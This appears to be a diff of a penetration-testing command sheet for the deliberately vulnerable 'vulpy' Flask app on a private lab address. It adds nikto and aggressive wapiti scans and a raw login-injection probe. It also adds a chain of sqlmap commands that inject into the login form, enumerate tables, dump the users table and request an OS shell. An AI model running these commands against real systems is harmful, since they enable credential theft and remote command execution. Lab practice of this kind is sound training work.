@@ -86,20 +86,96 @@ grep -Eo "([?&][a-zA-Z0-9_]+=)" posts.html || grep -i "form" -n posts.html
 grep -nEi "form|input|href|action|csrf|token|session|id=|/posts/" "$OUT/posts_5000.html" || true
 
 
-nikto -host http://${VULNBOX_IP} -output nikto_80.txt
-nikto -host http://${VULNBOX_IP}:5000 -output nikto_5000.txt
+nikto -host http://${VULNBOX_IP} -output nikto_80_scan.txt
+nikto -host http://${VULNBOX_IP}:5000 -output nikto_5000_scan.txt
 # Or run Burp/ZAP proxy manual testing for auth/session issues, CSRF, XSS, etc.
 
 
 wapiti -u http://${VULNBOX_IP}:5000 -f html -o wapiti_report.txt
+wapiti -u http://192.168.56.101:5000 --auth-type post -a "admin%admin" -s http://192.168.56.101:5000/login -f html -o wapiti_report -S aggressive -v 3
+
 
 
 # check for obvious stacktrace / Werkzeug in page
-curl -s "http://$IP:5000/posts" | grep -i Werkzeug -n || true
+curl -s "http://$VULNBOX_IP:5000/posts" | grep -i Werkzeug -n || true
 # attempt to trigger error page (for stacktrace) by hitting a non-existent route with bad input
-curl -s "http://$IP:5000/nonexistent?_debug=1" -o "$OUT/trigger_debug.html"
+curl -s "http://$VULNBOX_IP:5000/nonexistent?_debug=1" -o "$OUT/trigger_debug.html"
 grep -i "Traceback" "$OUT/trigger_debug.html" || true
 
+
+http://192.168.56.101:5000/user/login
+username=%27&password=admin&otp=
+
+
+# vulpy_session
+
+# recon
+sqlmap -u "http://192.168.56.101:5000/user/login" \
+  --data="username=admin&password=admin&otp=" \
+  -p username,password \
+  --cookie="vulpy_session=eyJ1c2VybmFtZSI6ICJhZG1pbiJ9" \
+  --batch \
+  --flush-session \
+  --level=5 \
+  --risk=3 \
+  --os="Linux" \
+  --random-agent \
+  --web-root="/srv/flask/vulpy/bad" \
+  --dbs
+
+# tables
+sqlmap -u "http://192.168.56.101:5000/user/login" \
+  --data="username=admin&password=admin&otp=" -p username \
+  --cookie="vulpy_session=eyJ1c2VybmFtZSI6ICJhZG1pbiJ9" \
+  --batch --flush-session --level=5 --risk=3 --dbms=sqlite \
+  --os="Linux" --random-agent \
+  --tables
+
+# tables#2
+sqlmap -u "http://192.168.56.101:5000/user/login" \
+  --data="username=admin&password=admin&otp=" \
+  --cookie="vulpy_session=eyJ1c2VybmFtZSI6ICJhZG1pbiJ9" \
+  --prefix="admin' AND " --suffix="-- kQKZ" -p username \
+  --batch --flush-session --level=5 --risk=3 --dbms=sqlite \
+  -D SQLite_masterdb \
+  --os="Linux" --random-agent \
+  --tables
+
+# users
+sqlmap -u "http://192.168.56.101:5000/user/login" \
+  --data="username=admin&password=admin&otp=" \
+  --cookie="vulpy_session=eyJ1c2VybmFtZSI6ICJhZG1pbiJ9" \
+  --prefix="admin' AND " --suffix="-- kQKZ" -p username \
+  --batch --flush-session --level=5 --risk=3 --dbms=sqlite \
+  -D SQLite_masterdb \
+  --os="Linux" --random-agent \
+  -T users --columns
+
+sqlmap -u "http://192.168.56.101:5000/user/login" \
+  --data="username=admin&password=admin&otp=" \
+  --cookie="vulpy_session=eyJ1c2VybmFtZSI6ICJhZG1pbiJ9" \
+  --prefix="admin' AND " --suffix="-- kQKZ" -p username \
+  --batch --flush-session --level=5 --risk=3 --dbms=sqlite \
+  -D SQLite_masterdb \
+  --os="Linux" --random-agent \
+  -T users --dump
+
+# os-shell [*]
+sqlmap -u "http://192.168.56.101:5000/user/login" \
+  --cookie="vulpy_session=eyJ1c2VybmFtZSI6ICJhZG1pbiJ9" \
+  --batch \
+  --flush-session \
+  --level=5 \
+  --risk=3 \
+  --dbs \
+  --dbms=sqlite \
+  --os="Linux" \
+  --random-agent \
+  --web-root="/srv/flask/vulpy/bad" \
+  --dbs \
+  --os-shell
+
+# sqlite3 ~/Downloads/db_users.sqlite "SELECT * FROM users;"
 
 
 sqlmap -u "http://${VULNBOX_IP}:5000/posts?id=1" -p id --batch --dbs --level=5 --risk=3 --output-dir=~/scans/vulpy
@@ -148,3 +224,4 @@ wpscan --username admin --url http://${VULNBOX_IP}:5000 --wordlist /usr/share/wo
 
 #tar -czf "vulpy_scan_${IP}_$(date +%F_%T).tgz" ./*
 #ls -lh
+
